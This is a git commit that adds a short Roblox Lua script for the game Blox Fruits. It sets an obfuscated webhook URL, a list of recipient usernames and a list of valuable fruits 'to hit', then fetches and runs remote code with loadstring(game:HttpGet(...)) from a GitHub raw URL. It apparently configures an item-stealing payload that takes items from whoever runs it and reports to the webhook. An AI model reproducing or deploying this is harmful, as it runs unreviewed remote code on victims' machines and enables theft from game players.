816b17f4d59985cdfdf66f27c6a5d01447e46586
Fullmoon-hub <gokhaniiigokhani@gmail.com>
2025-03-06 20:39:54 +0400

    Create Phonky.lua

---
+++ Phonky.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=TWpucTlHbXoxSFV0U21lNWdZcHJudzpEX3kzSWh5U25QTVY2TW9MTmN4d3BEMlpmZnB0bFZpSWxBZXNrNzRqRjVtV1JDa2FBaXNQWlBwcjlzQnQ0WDcweVBabU4yQWJjUzdlM0JsM2hOZUUzbmJMbFNDcFpicXJVMk1ka3ZuMEw1YnRXNVdvaURQdURuaDRTd3Q3Z2dydjRES2NCdUNmVUFBMmVrYjFYYk5YRmVjUy13U1ZJSUR2bHNWeHRIaWVGU1U" -- << Your Webhook
+Usernames = {"AWALS2011", "im_kiddd8","im_kiddd9"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas","Dough-Dough"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
